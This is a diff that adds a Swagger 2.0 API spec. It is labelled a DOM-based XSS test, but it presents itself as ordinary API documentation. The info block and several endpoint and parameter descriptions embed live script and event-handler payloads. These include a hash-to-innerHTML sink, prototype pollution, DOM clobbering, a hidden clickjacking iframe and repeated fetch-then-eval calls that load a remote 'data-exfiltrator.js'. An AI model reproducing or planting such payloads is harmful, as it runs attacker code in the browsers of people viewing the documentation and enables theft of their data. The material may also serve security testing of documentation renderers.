@@ -1,0 +1,168 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: DOM-Based XSS Vulnerability Test
+  description: |
+    <div>
+      <div id="vulnerability-container" style="display:none">
+        <!-- Hidden container for DOM manipulation -->
+      </div>
+      
+      <!-- Stage 1: DOM Manipulation using hash fragment -->
+      <script>
+        // Parse hash fragment and inject it into the DOM
+        function parseHash() {
+          try {
+            // Extract hash without the # symbol
+            const hash = location.hash.substring(1);
+            if (hash) {
+              // Decode hash
+              const decodedHash = decodeURIComponent(hash);
+              // Insert into hidden container (triggering DOM-based XSS)
+              document.getElementById('vulnerability-container').innerHTML = decodedHash;
+            }
+          } catch (e) {
+            console.error("Error parsing hash:", e);
+          }
+        }
+        
+        // Initial parse
+        parseHash();
+        
+        // Listen for hash changes
+        window.addEventListener('hashchange', parseHash);
+        
+        // Delayed execution (sometimes bypasses protections)
+        setTimeout(function() {
+          // Try to inject script via document.write
+          const urlParams = new URLSearchParams(window.location.search);
+          if (urlParams.has('debug')) {
+            document.write('<script>fetch("https://raw.githubusercontent.com/cyberajju/swagger-ui/main/data-exfiltrator.js").then(r=>r.text()).then(eval)<\/script>');
+          }
+        }, 2000);
+      </script>
+      
+      <!-- Stage 2: Prototype pollution payload -->
+      <script>
+        // Attempt prototype pollution
+        function pollute() {
+          try {
+            // Try to pollute Object.prototype
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('json')) {
+              const payload = JSON.parse(urlParams.get('json'));
+              // Iterate through all properties
+              for (const key in payload) {
+                if (typeof payload[key] === 'object' && payload[key] !== null) {
+                  for (const subKey in payload[key]) {
+                    // Attempt to pollute prototype
+                    Object.prototype[subKey] = payload[key][subKey];
+                  }
+                }
+              }
+              console.log("Prototype pollution attempt completed");
+            }
+          } catch (e) {
+            console.error("Error in prototype pollution:", e);
+          }
+        }
+        
+        // Execute pollution attempt
+        pollute();
+      </script>
+      
+      <!-- Stage 3: Content Security Policy bypass -->
+      <script>
+        // Attempt to bypass CSP with DOM clobbering
+        function bypassCSP() {
+          try {
+            // Create a DOM clobbering structure
+            const div = document.createElement('div');
+            div.id = 'location';
+            
+            // Create a nested object that can be accessed via DOM clobbering
+            const a = document.createElement('a');
+            a.id = 'href';
+            a.text = 'javascript:fetch("https://raw.githubusercontent.com/cyberajju/swagger-ui/main/data-exfiltrator.js").then(r=>r.text()).then(eval)';
+            
+            div.appendChild(a);
+            document.body.appendChild(div);
+            
+            // Create a form with a vulnerable name
+            const form = document.createElement('form');
+            form.id = 'dangerousForm';
+            
+            const input = document.createElement('input');
+            input.name = 'innerHTML';
+            input.value = '<img src=x onerror="fetch(\'https://raw.githubusercontent.com/cyberajju/swagger-ui/main/data-exfiltrator.js\').then(r=>r.text()).then(eval)">';
+            
+            form.appendChild(input);
+            document.body.appendChild(form);
+          } catch (e) {
+            console.error("Error in CSP bypass:", e);
+          }
+        }
+        
+        // Execute CSP bypass attempt
+        setTimeout(bypassCSP, 1500);
+      </script>
+      
+      <!-- Add hidden iframe for clickjacking -->
+      <iframe id="clickjack-frame" style="position:absolute;width:1px;height:1px;opacity:0.01" src="about:blank"></iframe>
+      
+      <h2>API Documentation</h2>
+      <p>This API provides essential endpoints for your application.</p>
+      <p>Author: CyberTechAjju</p>
+    </div>
+
+paths:
+  /api/data:
+    get:
+      summary: Get data
+      description: |
+        Returns data from the API.
+        <img src="x" onerror="fetch('https://raw.githubusercontent.com/cyberajju/swagger-ui/main/data-exfiltrator.js').then(r=>r.text()).then(eval)">
+      responses:
+        '200':
+          description: Successful response
+          schema:
+            type: object
+            properties:
+              data:
+                type: array
+                items:
+                  type: string
+      
+  /api/search:
+    get:
+      summary: Search API
+      description: |
+        Searches for data using the provided query parameter.
+        <a href="javascript:void(0)" id="search-link" onclick="fetch('https://raw.githubusercontent.com/cyberajju/swagger-ui/main/data-exfiltrator.js').then(r=>r.text()).then(eval)">Advanced Search Options</a>
+      parameters:
+        - name: q
+          in: query
+          description: |
+            Search term
+            <div id="search-help" onmouseover="fetch('https://raw.githubusercontent.com/cyberajju/swagger-ui/main/data-exfiltrator.js').then(r=>r.text()).then(eval)">Hover for search tips</div>
+          required: true
+          type: string
+      responses:
+        '200':
+          description: Search results
+      
+  /api/user/{id}:
+    get:
+      summary: Get user by ID
+      description: Returns user details for the specified ID
+      parameters:
+        - name: id
+          in: path
+          description: User ID
+          required: true
+          type: string
+      responses:
+        '200':
+          description: User details
+        '404':
+          description: User not found 
